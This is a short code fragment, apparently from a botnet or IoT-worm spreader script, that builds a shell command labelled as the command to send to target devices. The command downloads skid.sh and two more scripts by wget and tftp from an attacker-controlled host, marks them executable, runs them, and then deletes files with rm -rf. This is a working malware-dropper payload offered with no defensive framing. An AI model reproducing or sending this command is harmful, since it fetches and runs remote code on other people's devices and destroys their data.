...
cmd="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/skid.sh; chmod 777 skid.sh; sh skid.sh; tftp " + ip + " -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g " + ip + "; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *\x1b[0m")" #command to send
